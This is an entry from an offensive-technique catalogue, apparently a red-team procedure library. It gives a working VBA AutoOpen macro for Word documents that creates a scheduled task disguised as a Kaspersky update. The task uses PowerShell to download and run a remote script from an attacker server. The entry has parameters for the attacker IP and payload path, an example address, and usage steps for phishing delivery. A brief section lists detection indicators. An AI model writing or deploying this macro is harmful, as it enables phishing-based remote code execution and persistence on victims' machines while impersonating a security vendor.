---
id: 7e49ae77-6d13-4150-ac92-1fdfad7c905e
name: VBA-AutoOpen-to-Create-Scheduled-Task-for-PowerShell-Download
type: code
language: vba
verified: true
created_at: '2023-04-06T03:56:23.522461+00:00'
updated_at: '2023-04-10T20:36:51.609007+00:00'
platforms:
  - Windows
tags:
  - vba-macro
  - scheduled-task
  - office-attack
validated: true
---

# VBA-AutoOpen-to-Create-Scheduled-Task-for-PowerShell-Download

## Code

```vba
Sub AutoOpen()
    Set service = CreateObject("Schedule.Service")
    Call service.Connect
    Dim td: Set td = service.NewTask(0)
    td.RegistrationInfo.Author = "Kaspersky Corporation"
    td.settings.StartWhenAvailable = True
    td.settings.Hidden = False
    Dim triggers: Set triggers = td.triggers
    Dim trigger: Set trigger = triggers.Create(1)
    Dim startTime: ts = DateAdd("s", 30, Now)
    startTime = Year(ts) & "-" & Right(Month(ts), 2) & "-" & Right(Day(ts), 2) & "T" & Right(Hour(ts), 2) & ":" & Right(Minute(ts), 2) & ":" & Right(Second(ts), 2)
    trigger.StartBoundary = startTime
    trigger.ID = "TimeTriggerId"
    Dim Action: Set Action = td.Actions.Create(0)
    Action.Path = "C:\Windows\System32\powershell.exe"
    Action.Arguments = "-nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://$_ATTACKER_IP:$_PORT/$_SCRIPT_PATH'))"
    Call service.GetFolder("\").RegisterTaskDefinition("AVUpdateTask", td, 6, , , 3)
End Sub
Rem powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))"
```

## Description

This VBA code, placed in the AutoOpen subroutine of a .docm file, automatically creates a scheduled task when the document is opened. The task mimics a Kaspersky AV update, running PowerShell to download and execute a remote script after a 30-second delay. It uses the Task Scheduler COM object for creation, blending with legitimate processes for evasion.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | IP address of the attacker's server | 192.168.1.59 |
| $_PORT | Listening port on the server | 80 |
| $_SCRIPT_PATH | Path to the payload script | fezsdfqs |

## Usage

Embed this code in a Word .docm file via the VBA editor (Alt+F11). Deliver via phishing or shared drive. When opened with macros enabled, it registers the task silently. Modify the URL for your payload server before deployment. Used in initial access or persistence phases.

## Detection

- Office macro logging (enable VBA logging in Group Policy).
- Suspicious scheduled tasks: Query for "AVUpdateTask" or authors like "Kaspersky Corporation" via schtasks /query.
- PowerShell execution logs (Module/ScriptBlock logging) showing webclient downloads.
- Network monitoring for HTTP requests from PowerShell to unusual IPs.

## Related

- [[procedures/VBA-Macro-to-Create-Scheduled-Task-for-PowerShell-Execution-Masquerading-as-Kaspersky-Update]]
